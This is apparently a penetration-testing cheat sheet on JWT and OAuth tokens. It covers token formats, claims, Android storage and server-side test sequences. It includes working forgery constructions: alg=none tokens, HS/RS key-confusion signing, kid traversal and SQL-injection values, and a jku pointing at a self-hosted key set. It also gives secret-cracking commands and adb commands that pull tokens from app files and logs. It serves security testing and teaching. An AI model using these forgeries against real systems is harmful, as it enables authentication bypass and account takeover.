# 46 — Tokens · Cheat Sheet

Dense reference. No prose. Full explanations in [README.md](README.md).

---

## 1. Identify the token in one glance

| Shape | It is | Applies |
|---|---|---|
| `eyJ...` · 3 segments · 2 dots | **JWS / JWT** — signed, claims readable | All of §5 |
| 5 segments · 4 dots | **JWE** — encrypted | Nothing readable without the key |
| No dots, or 1 dot, random-looking | **Opaque** | No offline forgery at all |
| `ya29.` | Google OAuth access token (opaque) | Introspect at Google, not locally |
| `ghp_` `gho_` `ghu_` `ghs_` `ghr_` | GitHub PAT (opaque, checksummed) | GitHub auto-revokes published ones |
| `xox[bpsa]-` | Slack token | |
| `gAAAAA` | Fernet (Python `cryptography`) | AES-CBC + HMAC, leading timestamp |
| `v1.` `v2.` `v3.` `v4.` + 2 dots | PASETO | Algorithm fixed by version — confusion impossible by design |
| UUID | Session id | Check the version nibble; v1 leaks time + MAC |

```bash
echo "$T" | awk -F. '{print NF-1" dots, "NF" segments"}'
echo "$T" | cut -d. -f2 | tr '_-' '/+' | base64 -d 2>/dev/null; echo
python3 -B scripts/jwt-analyse.py --token "$T"
```

---

## 2. JOSE header members

| Member | Req | Meaning | Risk |
|---|---|---|---|
| `alg` | ✅ | Signing algorithm | **Attacker-controlled.** §5.1, §5.2 |
| `typ` | — | `JWT`, `at+jwt` (RFC 9068), `dpop+jwt` | `at+jwt` ⇒ RS must check `aud` |
| `kid` | — | Key identifier | **Attacker-controlled lookup key.** §5.3 |
| `cty` | — | Content type | Present ⇒ nested JWT |
| `crit` | — | Extensions the verifier MUST understand | Ignored ⇒ silent control skip |
| `jku` | — | **URL** to a JWKS | 🔴 Key injection + SSRF |
| `x5u` | — | **URL** to an X.509 chain | 🔴 Key injection + SSRF |
| `jwk` | — | **Embedded** public key | 🔴 Token names its own key |
| `x5c` | — | **Embedded** cert chain | 🔴 Same |
| `zip` | — | `DEF` compression | Compression-ratio side channels |

---

## 3. Registered claims (RFC 7519 §4.1)

| Claim | Type | Meaning | Failure when unchecked |
|---|---|---|---|
| `iss` | string | Issuer | Any issuer accepted. §5.6 |
| `sub` | string | Subject, unique **within** `iss` | Account key is `(iss, sub)`, never `sub` alone |
| `aud` | string \| array | Intended recipient | 🔴 "Sign in with X" takeover. §5.6 |
| `exp` | NumericDate | Refuse after | 🔴 Permanent credential. §5.5 |
| `nbf` | NumericDate | Refuse before | Low impact |
| `iat` | NumericDate | Minted at | Enables a max-age policy stricter than `exp` |
| `jti` | string | Unique id | No hook for replay detection / denylist |

**NumericDate** = seconds since epoch, as a JSON **number**. Not ms. Not a string.

## 3a. OIDC claims

| Claim | Meaning | Test |
|---|---|---|
| `nonce` | Client's per-request random, **inside** the signature | Does the client compare it? |
| `azp` | Authorized party — which client a multi-`aud` token is for | Checked when `aud` has >1 entry? |
| `auth_time` | When the **human** authenticated (≠ `iat`) | Step-up policy input |
| `acr` | Assurance level reached | |
| `amr` | Methods: `pwd` `mfa` `otp` `face` `swk` `hwk` | Forensics: was MFA actually used? |
| `at_hash` / `c_hash` | Binds `id_token` to the access token / code | |
| `sid` | Session id — OIDC back-channel logout | |
| `email` / `email_verified` | PII. **Never** the account key | `email_verified:false` ⇒ meaningless |

## 3b. Access-token and vendor claims

| Claim | Source | Notes |
|---|---|---|
| `scope` (string) / `scp` (array) | RFC 9068 / Azure | Space-separated. Enumerate against features |
| `client_id` | RFC 9068 | |
| `cnf` | RFC 7800 | **The sender-constraining claim.** `jkt` = DPoP, `x5t#S256` = mTLS |
| `roles` `groups` `entitlements` `permissions` | RFC 9068 / vendor | §5.8 — authorisation carried by the client |
| `realm_access` / `resource_access` | Keycloak | |
| `tid` `oid` `upn` `ver` | Azure AD | `tid` is an authorisation input in multi-tenant apps |
| `https://ns/roles` | Auth0 | Namespaced custom claims |

---

## 4. Algorithms

| `alg` | Family | Key | Verify ⇒ can mint? | Sig bytes |
|---|---|---|---|---|
| `HS256`/`384`/`512` | HMAC-SHA2 | Shared secret | **Yes** | 32 / 48 / 64 |
| `RS256`/`384`/`512` | RSA PKCS#1 v1.5 | Priv/pub | No | keysize/8 (256 @ 2048-bit) |
| `PS256`/`384`/`512` | RSA-PSS | Priv/pub | No | keysize/8 |
| `ES256`/`384`/`512` | ECDSA | Priv/pub | No | 64 / 96 / 132 — **raw r‖s, NOT DER** |
| `EdDSA` | Ed25519 / Ed448 | Priv/pub | No | 64 / 114 |
| `none` | — | — | **Anyone** | 0 |

Minimum HS key: **32 bytes** for HS256 (RFC 7518 §3.2), from a CSPRNG (RFC 8725 §3.5).

---

## 5. Attack per failure class

| # | Failure class | Attack | Command / construction | Severity |
|---|---|---|---|---|
| 5.1 | `alg: none` accepted | Rewrite header, empty sig | `hdr.payload.` ← **keep the trailing dot** | 🔴 Critical |
| 5.1 | Case-variant bypass | `NoNe` `NONE` `nOnE` | Same, different capitalisation | 🔴 Critical |
| 5.2 | HS/RS confusion | Re-sign HS256 with the **public key bytes** | `HMAC(pub_pem, hdr+"."+payload)` | 🔴 Critical |
| 5.3 | `kid` traversal | Point at a file you know | `kid: ../../../../dev/null` (empty key) | 🔴 Critical |
| 5.3 | `kid` SQLi | Return a key you chose | `kid: ' UNION SELECT 'k' --` | 🔴 Critical |
| 5.3 | `jku` / `x5u` | Host your own JWKS | `jku: https://you/jwks.json` + SSRF | 🔴 Critical |
| 5.3 | `jwk` / `x5c` | Embed your own key | Sign with your private key | 🔴 Critical |
| 5.4 | Weak HMAC secret | Crack offline, forge | `jwt-weak-secret.py`, `hashcat -m 16500` | 🔴 Critical |
| 5.5 | No / unenforced `exp` | **Replay an old token** | One `curl`. No forgery | 🔴 Critical |
| 5.5 | `exp` checked only if present | Delete the claim | Requires a signing path | 🟠 High |
| 5.6 | `iss` unchecked | Token from another issuer | | 🟠 High |
| 5.6 | `aud` unchecked | Token minted for **your own** client | Register a client, sign in as yourself | 🔴 Critical |
| 5.7 | Pure bearer | Replay from anywhere | Amplifier, not a standalone finding | ⚪ Context |
| 5.8 | Claim trusted as authorisation | Low-priv token → high-priv endpoint | Needs no forgery | 🟠 High / 🟡 Med |
| 3.9 | No rotation / no reuse detection | Use RT1 twice, then RT2 | 3 requests | 🟠 High |
| 3.10 | Logout does not revoke | Capture → logout → replay | 3 requests, 1 button | 🟠 High |
| 3.11 | DPoP not enforced | Strip proof, send `Bearer` | **The test that matters** | 🟠 High |
| 3.12 | Scope escalation on refresh | Ask for more scope | `-d scope="... admin"` | 🟠 High |

### Attack cheat-constructions

```python
# base64url segment
seg = lambda o: base64.urlsafe_b64encode(
    json.dumps(o, separators=(",",":"), sort_keys=True).encode()).rstrip(b"=").decode()

# alg=none                     (TRAILING DOT IS MANDATORY)
tok = f'{seg({"alg":"none","typ":"JWT"})}.{seg(claims)}.'

# HS/RS confusion
si  = f'{seg({"alg":"HS256","typ":"JWT","kid":KID})}.{seg(claims)}'
sig = base64.urlsafe_b64encode(hmac.new(PUB_PEM, si.encode(), hashlib.sha256).digest()).rstrip(b"=").decode()
tok = f"{si}.{sig}"

# offline secret recovery -- no server, no rate limit, no logging
hmac.compare_digest(hmac.new(cand.encode(), si, hashlib.sha256).digest(), b64url_decode(sig))
```

### HS/RS confusion — key-byte variants, try in this order

1. PEM **with** `-----BEGIN PUBLIC KEY-----`, newlines, and trailing `\n`
2. PEM **without** trailing newline
3. DER (the base64 body, decoded)
4. PKCS#1 form (`BEGIN RSA PUBLIC KEY`) instead of SPKI
5. Modulus `n` alone — raw bytes, or the JWKS base64url string
6. The whole JWKS JSON document

---

## 6. Response-code interpretation

| Code | Meaning | Next |
|---|---|---|
| **200** | Forgery **accepted** | The finding. Capture request + response |
| 401 | Rejected | That variant only. Try the next |
| **403** | **Accepted**, then authz failed | **Chase it.** Change `sub` / add scope |
| 500 | Parser broke | Read the trace for library + version |
| 400 | Malformed | Check encoding — a `+` means standard base64 |

**Always establish the 200 baseline with the unmodified token first.**

---

## 7. Storage on Android

| Option | Protects against | Does NOT protect against | Finding on its own? |
|---|---|---|---|
| Memory only | Every offline attack | Code execution in-process | **No** — correct design |
| SharedPreferences (plain) | Other apps (sandbox + FBE) | Root · `adb backup` · `run-as` · traversal bugs | **No** — Informational |
| `EncryptedSharedPreferences` | + anyone with a **copy** of the file | Code execution in-process | **No** — a positive |
| `AccountManager` | Nothing extra | Other apps of the same account type | Depends on who else declares the type |

| Token | Home |
|---|---|
| Access token | Memory, re-fetched on cold start |
| Refresh token | `EncryptedSharedPreferences` |
| ID token | **Nowhere** — consume and discard |

### Leak paths

| Channel | Test |
|---|---|
| logcat | `adb logcat --pid=$(adb shell pidof -s PKG)` during login |
| Crash reporter | Proxy the reporter; force a crash |
| Analytics SDK | Proxy **third-party** hosts during login |
| Auto Backup | `dataExtractionRules` — **both** `cloud-backup` **and** `device-transfer` |
| `adb backup` | Failure ≠ not backed up |
| SQLite WAL | Pull `.db`, `.db-wal`, `.db-shm`. `strings *-wal` |
| `.bak` prefs | `ls -la shared_prefs/` — read **every** file |
| `dumpsys` | Broadcast/intent extras recorded in cleartext |
| WebView | `localStorage` reachable by any script in the page |

---

## 8. Commands

```bash
# --- classify and analyse, offline, never transmits -------------------------
python3 -B scripts/jwt-analyse.py --token "$T"
python3 -B scripts/jwt-analyse.py --file authstate.json --scan
python3 -B scripts/jwt-analyse.py --token "$T" --expect-iss URL --expect-aud ID --expect-alg RS256
python3 -B scripts/jwt-analyse.py --self-test          # prove the socket guard

# --- crack / grade an HS* secret -------------------------------------------
python3 -B scripts/jwt-weak-secret.py --token-file t.jwt
python3 -B scripts/jwt-weak-secret.py --token-file t.jwt --wordlist rockyou.txt --rules
python3 -B scripts/jwt-weak-secret.py --grade "$SECRET"
hashcat -m 16500 t.jwt rockyou.txt                     # GPU, ~10^4 x faster

# --- run every attack against both verifiers -------------------------------
python3 -B labs/gauntlet/issuer.py --workdir ~/lab --init
python3 -B labs/gauntlet/issuer.py --workdir ~/lab --mint --sub alice --ttl 900
python3 -B labs/gauntlet/run-gauntlet.py --workdir ~/lab

# --- verify with a key you trust -------------------------------------------
python3 -B examples/02-correct-verifier.py --token "$T" \
    --issuer https://issuer.example.com --audience com.example.app \
    --rsa-key rsa-2026-08=pub.pem

# --- on the device ----------------------------------------------------------
bash scripts/token-storage-sweep.sh com.example.app
bash scripts/token-storage-sweep.sh com.example.app --logcat 60
frida -U -f com.example.app -l scripts/token-hooks.js

# --- read it by hand --------------------------------------------------------
echo "$T" | cut -d. -f1 | tr '_-' '/+' | base64 -d; echo
echo "$T" | cut -d. -f2 | tr '_-' '/+' | base64 -d; echo
adb shell "run-as PKG cat /data/data/PKG/shared_prefs/auth.xml"
adb logcat -d | grep -oE 'eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]*' | sort -u
```

---

## 9. Server tests, as request sequences

```bash
# BASELINE -- must be 200 or nothing else means anything
curl -s -o /dev/null -w '%{http_code}\n' -H "Authorization: Bearer $AT" "$API"

# REVOCATION / LOGOUT   (3 requests, 1 button press)
curl -s -o /dev/null -w 'before %{http_code}\n' -H "Authorization: Bearer $AT" "$API"
#   >>> tap Log Out in the app <<<
curl -s -o /dev/null -w 'after  %{http_code}\n' -H "Authorization: Bearer $AT" "$API"
curl -s -X POST "$TOKEN_EP" -d grant_type=refresh_token -d refresh_token="$RT" -d client_id="$CID"

# ROTATION + REUSE DETECTION
curl -s -X POST "$TOKEN_EP" -d grant_type=refresh_token -d refresh_token="$RT1" -d client_id="$CID" | tee r1.json
curl -s -X POST "$TOKEN_EP" -d grant_type=refresh_token -d refresh_token="$RT1" -d client_id="$CID"
curl -s -X POST "$TOKEN_EP" -d grant_type=refresh_token \
     -d refresh_token="$(jq -r .refresh_token r1.json)" -d client_id="$CID"

# SCOPE ESCALATION ON REFRESH
curl -s -X POST "$TOKEN_EP" -d grant_type=refresh_token -d refresh_token="$RT" \
     -d scope="openid admin payments.write" | jq .scope

# DPoP DOWNGRADE -- the one that decides whether DPoP is real
curl -s -o /dev/null -w '%{http_code}\n' -H "Authorization: Bearer $AT" "$API"   # want 401

# SCOPE ENFORCEMENT
curl -s -o /dev/null -w '%{http_code}\n' -H "Authorization: Bearer $READ_ONLY" \
     -X POST "$API/transfer" -d '{"amount":1}'                                   # want 403
```

| Test | RT1 2nd use | RT2 | Verdict |
|---|---|---|---|
| Rotation | Success | — | ❌ None. Permanent access |
| Rotation | Fail | Success | ⚠️ Rotation, no reuse detection |
| Rotation | Fail | Fail | ✅ Correct |

---

## 10. Lifetimes

| Token | Sensible | Verdict if longer |
|---|---|---|
| ID token | 5–15 min | It describes one past login |
| Access token, low priv | 15–60 min | Theft window grows linearly |
| Access token, write/payment | **5–15 min** | Highest-value ⇒ shortest-lived |
| Refresh, consumer | 30–90 days **with rotation** | Without rotation = a 90-day password |
| Refresh, high assurance | Hours–days | |
| No `exp` | — | 🔴 **Critical, always** |

Clock skew: 60 s generous · >300 s needs justification · >3600 s is a finding.

---

## 11. Sender constraining

| | DPoP (RFC 9449) | mTLS (RFC 8705) |
|---|---|---|
| Claim | `cnf.jkt` | `cnf["x5t#S256"]` |
| Layer | Application | Transport |
| Needs PKI | No | Yes |
| Per-request cost | 1 ECDSA sig | None after handshake |
| Proof claims | `jti` `htm` `htu` `iat` `ath` (+`nonce`) | — |

| DPoP server check | Stops |
|---|---|
| `thumbprint(jwk) == cnf.jkt` | Using a stolen token with your own key |
| Proof signature | Fabricating a proof for another key |
| `htm` / `htu` | Replaying a `GET` proof against a `POST` |
| `iat` recent | Replaying an old proof forever |
| `jti` unseen | Replaying the same proof verbatim |
| `ath == SHA256(token)` | Using a captured proof with a different token |

**Four tests:** baseline 200 · **Bearer downgrade must 401** · proof replay 401 · key
mismatch 401. Neither DPoP nor mTLS stops in-process code execution.

---

## 12. Revocation options

| Option | Real revocation? | Cost |
|---|---|---|
| Short lifetimes | No — bounds lateness | Free. Right for most systems |
| `jti` denylist | Yes | Shared low-latency store at every RS |
| Per-user not-valid-before timestamp | Yes | One integer/user; makes "log out everywhere" real |
| Opaque + introspection | Yes, immediate | A round trip per request |

---

## 13. Is it a finding? (§5.10)

| # | Condition | Evidence required |
|---|---|---|
| 1 | Over-scoped | Scope↔feature table; a row with no feature |
| 2 | Long-lived | `exp - iat`, or a refresh token still working after N days |
| 3 | Replayable after logout | Two `curl`s, both 200 |
| 4 | Accepted without verification | The forged token **and the server's 200** |
| 5 | Readable by another app | Path + modes + SELinux labels + zero-permission PoC |

❌ *"The app stores a token in SharedPreferences."*
✅ *"The refresh token is stored plaintext at `<path>` **and remains valid after logout**
(HTTP 200 replaying it 4 min later). With a 90-day lifetime and no rotation, any copy grants
3 months of access. Retrieval required `run-as`, available because the build ships
`debuggable="true"`."*

> **What did I learn that I did not already have?**
> Own token, own account → nothing → not a finding.

---

## 14. Static grep set

```bash
jadx -d out/ app.apk

grep -rn "JWT.decode(\|parseClaimsJwt(\|PlainJWT"          out/sources/   # decode ≠ verify
grep -rn 'split("\\\\.")'                                   out/sources/   # hand-rolled
grep -rn "Base64.decode" out/sources/ | grep -i "url_safe\|, 8\|, 10\|, 11"
grep -rn "putString" out/sources/ | grep -iE "token|auth|session|jwt"
grep -rn "EncryptedSharedPreferences\|MasterKey"            out/sources/
grep -rn "setAuthToken\|getAuthToken"                       out/sources/
grep -rn "verify_aud\|withAudience\|withIssuer"             out/sources/   # absence = finding
grep -rn '"Bearer'                                          out/sources/
grep -rniE "jwt.?secret|signing.?key|hmac.?key"             out/
grep -rn "revoke\|logout\|signOut"                          out/sources/
grep -rn "Log\." out/sources/ | grep -iE "token|bearer|jwt"

apktool d app.apk -o work/
grep -rn "Landroid/util/Base64;->decode" work/smali*/
grep -rn 'const-string.*"\(sub\|exp\|aud\|iss\|jti\)"' work/smali*/   # obfuscation-proof
grep -nE 'allowBackup|dataExtractionRules|debuggable' work/AndroidManifest.xml
```

Smali `Base64` flag constants: `0x8` = `URL_SAFE` · `0xa` = `|NO_WRAP` · `0xb` = `|NO_PADDING`.

---

## 15. Android version notes

| Facility | Since |
|---|---|
| `android.util.Base64` (`URL_SAFE`) | API 8 |
| `java.util.Base64.getUrlEncoder()` | **API 26** — crashes below without desugaring |
| `AccountManager` | API 5 |
| `AndroidKeyStore` | API 18 |
| Hardware-backed keys · `EncryptedSharedPreferences` | API 23 |
| StrongBox | API 28 |
| `dataExtractionRules` (two sections) | API 31 |

---

## 16. RFC index

| RFC | Subject |
|---|---|
| 7519 | JWT — claims, NumericDate, `none` |
| 7515 | JWS — 3 segments, signing input |
| 7516 | JWE — 5 segments |
| 7517 | JWK / JWKS |
| 7518 | JWA — **§3.2: HMAC key ≥ hash output** |
| 7638 | JWK thumbprint — required members, sorted, no whitespace |
| 4648 §5 | base64url |
| **8725** | **JWT BCP — read this one** |
| 6750 | Bearer token usage |
| 9449 | DPoP |
| 8705 | mTLS-bound tokens |
| 7800 | `cnf` claim |
| 7009 | Revocation |
| 7662 | Introspection |
| 9068 | JWT access-token profile (`at+jwt`) |
| 8693 | Token exchange |

---

Back to [the chapter](README.md) · [mind map](mindmap.md) · [FAQ](faq.md) ·
[references](references/README.md)
